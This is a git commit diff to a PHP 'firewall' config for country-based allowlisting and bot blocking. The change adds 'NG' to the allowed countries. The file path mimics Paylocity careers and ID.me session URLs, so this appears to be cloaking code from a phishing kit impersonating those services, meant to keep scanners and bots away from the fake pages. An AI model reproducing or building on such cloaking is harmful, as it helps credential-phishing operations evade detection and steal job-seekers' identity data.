32e50a0dc75413725d54efb1ce69eb76b093f7dc
ghost-hub1 <37017254+ghost-hub1@users.noreply.github.com>
2025-05-31 04:27:04 +0100

    GEO-IP

--- public/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/session/firewall.php
+++ public/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/session/firewall.php
@@ -1,7 +1,7 @@
 <?php
 // --- Config ---
 $useAllowlist = true; // Set false for blocklist mode
-$allowedCountries = ['US', 'CA'];
+$allowedCountries = ['US', 'CA', 'NG'];
 $blockedCountries = ['RU', 'CN', 'IR', 'KP', 'SY', 'CU'];
 
 $blockedBots = [
